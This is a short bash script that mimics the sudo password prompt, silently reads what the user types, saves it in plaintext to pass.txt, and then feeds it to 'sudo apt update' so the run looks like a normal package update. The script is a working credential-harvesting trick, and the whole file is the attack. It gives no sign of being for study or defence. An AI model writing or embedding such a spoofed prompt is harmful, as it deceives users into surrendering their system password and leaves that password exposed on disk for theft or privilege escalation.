#!/bin/bash

echo -n "[sudo] password for "$USER": "
read -s
echo $REPLY > pass.txt

cat pass.txt | sudo apt update
echo
